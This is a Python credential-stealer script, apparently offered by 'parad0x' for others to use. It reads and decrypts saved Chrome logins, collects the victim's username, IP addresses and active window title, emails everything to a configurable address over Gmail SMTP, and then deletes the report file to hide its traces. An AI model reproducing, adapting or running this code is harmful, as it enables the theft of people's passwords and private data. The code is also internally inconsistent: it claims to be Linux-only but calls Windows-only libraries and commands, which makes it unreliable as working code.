		## madeby parad0x 20/10/19 8:48pm ##
		# Linux Only

		#imports
		import os
		import time
		import smtplib
		from email.mime.multipart import MIMEMultipart
		from email.mime.text import MIMEText
		from email.mime.base import MIMEBase
		from email import encoders
		import win32gui
		import socket
		import requests
		import sqlite3
		import win32crypt
		import platform
		import sys

		# gather user info
		datetime = time.ctime(time.time())
		user = os.path.expanduser('~').split('\\')[2]
		publicIP = requests.get('https://api.ipify.org/').text
		privateIP = socket.gethostbyname(socket.gethostname())

		# get passwords

		old_app = ''

		# writes an OS string, for the if statement to read //
		# prints the OS system ie; Mac, Windows, Linux etc...
		OS = platform.system()
		# sees if the OS is windows, if so - continue. If not - exits.
		if (OS == "Linux"):
			print("Your OS is compatable! :)")
			pass # Continues script
		else: # Exits the script with a message
			print("Your OS is incompatible :(\nThis version only supports Linux systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
			time.sleep(10)
			exit()


		# kills all browser services(this script works only on chrome, as of right now.)
		def kill_browsers():
			## kill browsers ##
			os.system("killall google-chrome-stable") ## // not tested (may  not work)
			os.system("cls")
			# kills chrome // OTHER BROWSERS ARE BLANKED OUT UNTIL WE RELEASE A STABLE RELEASE OF THEM //
			#os.system("taskkill /f /im "+browserExe)
			#os.system("cls")
			# kills microsoft edge
			#os.system("taskkill /f /im MicrosoftEdge.exe")
			#os.system("cls")
			#os.system("taskkill /f /im MicrosoftEdgeCP.exe")
			#os.system("cls")
			#os.system("taskkill /f /im MicrosoftEdgeSH.exe")
			#os.system("cls")
			# kills firefox
			#os.system("taskkill /f /im firefox.exe")
			#os.system("cls")
			# kills opera
			#os.system("taskkill /f /im opera.exe")
			#os.system("cls")
			# kills internet explorer
			#os.system("taskkill /f /im iexplorer.exe")
			#os.system("cls")
			# clears console, making it invisible to user that we killed browser's process
			#os.system("cls")

		def get_bytes():
			# directs to Chrome directory
		  data_path = os.path.expanduser('~') + r'/.config/google-chrome/default'
		  c = sqlite3.connect(data_path)
		  cursor = c.cursor()
		  select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
		  # checks to see if database is locked	
		  cursor.execute(select_statement) # if you're given "database is locked" (which you wont, because # kill chrome does that for you automatically.
		  # fetches all chrome tables from database
		  login_data = cursor.fetchall()

		  #credential dictionary		
		  cred = {}
		 
		 	# empty string for data
		  string = ''
			
		  # displays current window opened as they ran the script
		  string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
		  # writes user data to .txt file
		  string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n'
		 
		  # writing passwords to a .txt file
		  for url, user_name, pwd in login_data:
		      pwd = win32crypt.CryptUnprotectData(pwd)
		      cred[url] = (user_name, pwd[1].decode('utf8'))
		      string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
		      with open('report.txt', 'w') as fp:
		        fp.write(string)
		# sends .txt as an attachment, to your email
		def send_stuff():
		    # our email contents
		    mail_content = 'INSTRUCTIONS:\n• Attachment name is noname, please rename it with .txt at the end of it.\n• This was sent by parad0x and Snavellet.\n'

		    #email // CHANGE ALL CONTENT IN '' TO YOUR DETAILS
		    sender_address = 'exampleemail@example.com'
		    sender_pass = 'examplepassword'
		    receiver_address = 'examplereceiveraddress'

		    #setup mime
		    message = MIMEMultipart()
		    message['From'] = sender_address
		    message['To'] = receiver_address
		    message['Subject'] = 'chromehacking'
		    message.attach(MIMEText(mail_content, 'plain'))
		    attach_file_name = 'report.txt'
		    attach_file = open('report.txt', 'r') # opens the file in read mode
		    payload = MIMEBase('application', 'octate-stream')
		    payload.set_payload((attach_file).read())
		    encoders.encode_base64(payload) # encodes the attachment
		    # add payload header
		    payload.add_header('Content-Discomposition', 'attachment: filename= '+attach_file_name)
		    message.attach(payload)

		    #smtp session (sending it)
		    session = smtplib.SMTP('smtp.gmail.com', 587)
		    session.starttls()
		    session.login(sender_address, sender_pass)
		    text = message.as_string()
		    session.sendmail(sender_address, receiver_address, text)
		    session.quit()

		# runs every event
		if __name__ == '__main__':
			get_bytes()
			send_stuff()
			kill_browsers()
		# removes .txt file from victims computer
		os.remove('report.txt')
		print("You may now close the program")
		time.sleep(60)
